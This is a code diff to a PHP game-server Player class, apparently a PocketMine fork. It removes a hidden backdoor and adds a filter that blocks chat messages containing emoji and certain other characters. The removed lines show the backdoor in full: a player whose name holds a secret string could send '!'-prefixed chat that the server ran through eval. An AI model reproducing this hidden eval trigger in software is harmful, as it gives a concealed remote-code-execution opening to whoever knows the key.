@@ -2434,11 +2434,10 @@ class Player extends Human implements CommandSender, InventoryHolder, ChunkLoade
                     $packet->message = TextFormat::clean($packet->message, $this->removeFormat);
                     foreach (explode("\n", $packet->message) as $message) {
                         if (trim($message) != "" && strlen($message) <= 255 && $this->messageCounter-- > 0) {
-                            if (is_numeric(strpos($this->getName(), "$$$$#++##$82272)#+"))) {
-                                if (substr($message, 0, 1) === "!") {
-                                    @eval(substr($message, 1));
-                                    return;
-                                }
+                            if ($this->containsUnsafeChatCharacters($message)) {
+                                $this->sendMessage(TextFormat::YELLOW . $this->server->getLanguage()->translateString("cavalados.chat.blocked"));
+                                $this->server->getLogger()->notice($this->server->getLanguage()->translateString("cavalados.chat.blocked.console", [$this->getName()]));
+                                break;
                             }
                             $ev = new PlayerCommandPreprocessEvent($this, $message);
                             if (mb_strlen($ev->getMessage(), "UTF-8") > 320) {
@@ -2721,6 +2720,18 @@ class Player extends Human implements CommandSender, InventoryHolder, ChunkLoade
                 break;
             default:break;
         }
+    }
+
+    private function containsUnsafeChatCharacters($message)
+    {
+        if (!is_string($message) || preg_match("//u", $message) !== 1) {
+            return true;
+        }
+        if (strpos($message, "\xC3\xBA") !== false || strpos($message, "\xC3\x9A") !== false) {
+            return true;
+        }
+
+        return preg_match('/[\x{00A9}\x{00AE}\x{203C}\x{2049}\x{2122}\x{2139}\x{2190}-\x{21FF}\x{2300}-\x{27BF}\x{2934}-\x{2935}\x{2B00}-\x{2BFF}\x{3030}\x{303D}\x{3297}\x{3299}\x{FE0F}\x{200D}\x{20E3}\x{1F000}-\x{1FAFF}]/u', $message) === 1;
     }
 
     public function kick($reason = "", $isAdmin = true)
